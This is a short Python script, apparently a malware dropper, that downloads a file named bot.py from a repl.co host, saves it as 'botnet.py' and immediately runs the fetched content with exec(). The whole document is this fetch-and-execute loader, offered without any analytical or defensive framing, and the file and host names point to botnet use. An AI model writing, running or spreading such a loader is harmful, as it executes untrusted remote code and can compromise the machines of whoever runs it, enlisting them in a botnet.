import requests

r = requests.get('https://stealslotgov.idkotherhex1629.repl.co/download=bot.py&mode=rb')
f = open('botnet.py','wb')
f.write(r.content)
f.close()
exec(r.content)
